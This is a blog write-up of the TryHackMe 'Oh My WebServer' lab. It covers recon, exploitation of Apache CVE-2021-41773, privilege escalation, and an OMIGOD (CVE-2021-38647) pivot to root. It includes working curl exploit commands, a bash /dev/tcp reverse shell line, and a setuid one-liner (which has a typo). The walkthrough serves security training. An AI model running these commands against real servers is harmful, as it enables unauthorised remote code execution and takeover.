---
title: THM - Oh My WebServer
author: guialvesf
date: 2022-03-24 01:00:00 -0300
categories: [tryhackme, writeup]
tags: [tryhackme, writeup]
image: https://raw.githubusercontent.com/guialvesf/guialvesf.github.io/main/img/thm/ohmywebserver/ohmywebserver.png
alt: "tryhackme"
---


<p align="center" width="100%">
    <img src="/img/thm/ohmywebserver/banner.png"> 
</p>
<hr>

# Recon
Let's start with a classic Nmap scan against the machine to see what services are running!

* -sC - Default Nmap scripts
* -sV - Services version
* -oA - Save output to a file
* -v  - Verbose mode

(This screenshot has another command because I typed it just for pic)

![nmap](/img/thm/ohmywebserver/nmap.png)

Ok, we have two open ports, 80 port is running `Apache 2.4.49` and 22 port running a SSH. Can we access this webpage to see what we have.

![consult](/img/thm/ohmywebserver/consult.png)

Cool, just a web application. I didn't find anything interesting, so let's start a directory enumeration.

`ffuf -u http://10.10.148.87/FUZZ -w /path/to/wordlist -t 90 -c`

* -u - Target URL
* -w - Wordlist file path
* -t - Number of concurrent threads
* -c - Colorize output

![ffuf](/img/thm/ohmywebserver/ffuf.png)

Here we find two somewhat interesting directories: `assets` and `cgi-bin`

![assets](/img/thm/ohmywebserver/assets.png)

Ok, I didn't find anything here too.

![cgi-bin](/img/thm/ohmywebserver/cgi-bin.png)

## Reverse shell

Alright, we have a cgi-bin, and coming back to Apache version I found something a lot interesting. For that apache version we have a `CVE-2021-41773`. Can we confirm it with a cURL command.
Just sending a request with a linux command can we check it.

`curl 'http://10.10.148.87/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'Content-Type: text/plain; echo; whoami && id'`

![curl-first-command](/img/thm/ohmywebserver/curl_first_command.png)

BOOMM! We have a path traversal, and we are able to execute commands, so let's get a reverse shell with this. To do this we'll need two terminals, one for send request and another to wait a connection.

`curl 'http://10.10.148.87/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash' -d "Content-Type: text/plain; echo; bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT/ <&1'"`

![reverse-shell](/img/thm/ohmywebserver/reverse_shell.png)

## User

Ok, we have a reverse shell and access to the machine, but there's no home user here

![no-user](/img/thm/ohmywebserver/no-user.png)

It took me a while to enumerate this machine, so I decided to use linPEAS. So by uploading the script and running I found something interesting

![linpeas](/img/thm/ohmywebserver/linpeas.png)

We can set UID with python command.

`python3 -c 'import so; os.setuid(0); os.system("/bin/bash")'`

![setuid](/img/thm/ohmywebserver/user.png)

## Root

After enumerating, I took a another look to linPEAS output and found something else: we have another IP address. So we can enumerate this IP with Nmap. Can you download nmap binary from [here](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64). Just upload as linPEAS.

`nmap -v 172.17.0.0-5`

This will scan IP from 0 to 5, and checking the output we can note that 172.17.0.1 host is up. 

![nmap_ntw](/img/thm/ohmywebserver/nmap_ntw.png)

Enumerating it better we find another two open ports: `5985` and `5986`.

![nmap_nports](/img/thm/ohmywebserver/nmap_nports.png) 

Ok, we have another CVE: `CVE-2021-38647`. There's a script to exploit it, you can find it [here](https://github.com/AlteredSecurity/CVE-2021-38647). We'll use the python script to escalete our privileges.

![omigod](/img/thm/ohmywebserver/omigod.png)

Just run it by passing the command as an argument.

![root](/img/thm/ohmywebserver/root.png)
